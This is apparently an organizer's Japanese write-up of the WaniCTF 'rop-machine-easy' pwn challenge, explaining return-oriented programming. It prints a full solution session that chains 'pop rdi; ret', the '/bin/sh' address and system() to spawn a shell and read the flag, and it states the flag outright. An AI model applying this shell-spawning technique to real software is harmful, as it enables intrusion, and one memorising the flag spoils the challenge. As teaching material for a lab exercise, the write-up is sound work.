# rop-machine-easy [pwn]
## 問題文

```
nc rop-easy.pwn.wanictf.org 9003
```

### ヒント

+ ropでsystem("/bin/sh")を実行して下さい。
+ "/bin/sh"のアドレスは提供されています
+ rop machineの使い方->[wani-hackase/rop-machine](https://github.com/wani-hackase/rop-machine/)

### 使用ツール例
+ [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)

### gccのセキュリティ保護

+ *Partial RELocation ReadOnly (RELRO)*
+ Stack Smash Protection (SSP)有効
+ No eXecute bit(NX)有効
+ *Position Independent Executable (PIE)無効*

## FLAG

```
FLAG{this-is-simple-return-oriented-programming}
```

## 解法

### はじめに

まずはrop-machineの動作を理解して下さい。
- [wani-hackase/rop-machine](https://github.com/wani-hackase/rop-machine/)

解法例は以下になります。

```
$ nc rop-easy.pwn.wanictf.org 9003

"/bin/sh" address is 0x404070

[menu]
1. append hex value
2. append "pop rdi; ret" addr
3. append "system" addr
8. show menu (this one)
9. show rop_arena
0. execute rop
> 2
"pop rdi; ret" is appended
> 1
hex value?: 404070
0x0000000000404070 is appended
> 3
"system" is appended
> 0
     rop_arena
+--------------------+
| pop rdi; ret       |<- rop start
+--------------------+
| 0x0000000000404070 |
+--------------------+
| system             |
+--------------------+
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{this-is-simple-return-oriented-programming}
^C
$
```

### 解説

1問目のnetcatから正答者数が一気に40\%以下になってしまって開催中から初心者向けとしてはやっちまった感を感じてしまって落ち込んでしまった問題です。
rop arenaにアドレスを追加して行ってexecute ropをすると先頭からプログラムが実行されます。

作らなければならなないropは
```
+--------------------+
| pop rdi; ret       |<- rop start
+--------------------+
| 0x0000000000404070 |
+--------------------+
| system             |
+--------------------+
```
になります。
`0x404070`は`/bin/sh`が入っているアドレスになります。
これを実行するとC言語で書くと
```
	system("/bin/sh");
```
と等価になります。
`"/bin/sh"`の部分は実際は`/bin/sh`という文字列が格納されているメモリのアドレスになるのでC言語では
```
	system(0x404070);
```
が呼ばれています。

ROPでは、まず、`pop rdi; ret`が呼ばれると、`pop rdi`でスタックに積まれている`0x404070`がRDIレジスタに入って`ret`で次の`system`を実行します。
RDIは、`system`関数が実行される時の第1引数の役割を果たします。

解説書いてて思ったんですが、命令レベルで関数呼び出しがどうなっているかが分かる問題があった方が良かったかもですね．．．

ROPの挙動は去年のWaniCTF'20でも解説していますのでこちらをご参照下さい。
- [wanictf2020-writeup/pwn/06-rop-func-call at master · wani-hackase/wanictf2020-writeup](https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/06-rop-func-call)
ただ、これも読み直してみると難しいですね．．．
ROPの分かりやすい説明はどうすればいいのかなぁ．．．
